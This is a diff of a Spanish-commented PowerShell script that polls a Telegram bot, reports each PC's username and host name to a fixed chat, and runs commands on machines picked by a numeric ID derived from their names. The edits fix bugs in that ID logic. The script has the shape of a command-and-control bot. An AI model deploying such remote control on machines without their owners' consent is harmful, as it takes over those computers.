@@ -11,14 +11,13 @@ $User   = $env:USERNAME
 # ==============================================================================
 # NO BORRAR #############################################################
 # ==============================================================================
-
 # ==============================================================================
 # CONFIGURACIÓN DEL BOT DE TELEGRAM 
 # ==============================================================================
 # Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
-    Add-Type -MemberDefinition $MemberDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
+    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
 } catch {}
 
 # Habilitar TLS 1.2
@@ -43,7 +42,7 @@ try {
 } catch {}
 
 # ==============================================================================
-# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS
+# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
 # ==============================================================================
 while ($true) {
     try {
@@ -56,11 +55,11 @@ while ($true) {
 
             if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                 
-                # Procesamiento seguro de comandos
+                # CORRECCIÓN DE MATRIZ: Extraemos de forma segura el comando y el ID del argumento
                 $Partes = $TextoRecibido -split " "
-                $Comando = ([string]$Partes[0]).ToLower()
+                $Comando = [string]$Partes[0]
+                $Comando = $Comando.ToLower()
                 
-                # Leer el ID numérico enviado tras el espacio (Ej: /notepad 1)
                 $IDDestino = ""
                 if ($Partes.Count -gt 1) {
                     $IDDestino = [string]$Partes[1]
@@ -68,13 +67,15 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    # Cada PC calcula su número en base a la hora actual de forma fija pero única para el día
-                    # Esto simula un ID numérico automático sin necesidad de base de datos central
-                    $Seed = [int]([char[]]$MiPC -join "") % 10
+                    # Calcula un ID del 1 al 9 único y fijo para esta PC según su nombre
+                    $LetrasPC = [char[]]$MiPC
+                    $TotalAscii = 0
+                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
+                    $Seed = $TotalAscii % 9
                     if ($Seed -eq 0) { $Seed = 1 }
                     $NumAsignado = [string]$Seed
 
-                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numérico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
@@ -95,12 +96,15 @@ while ($true) {
                     continue
                 }
 
-                # CALCULAR MI PROPIO ID PARA COMPARAR CON EL SOLICITADO
-                $MiSeed = [int]([char[]]$MiPC -join "") % 10
+                # CALCULAR MI PROPIO ID PARA COMPARAR
+                $MisLetras = [char[]]$MiPC
+                $MiAscii = 0
+                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
+                $MiSeed = $MiAscii % 9
                 if ($MiSeed -eq 0) { $MiSeed = 1 }
                 $MiIDNum = [string]$MiSeed
 
-                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el asignado a esta máquina
+                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                     
                     switch ($Comando) {
@@ -131,7 +135,6 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
-
 
 
 
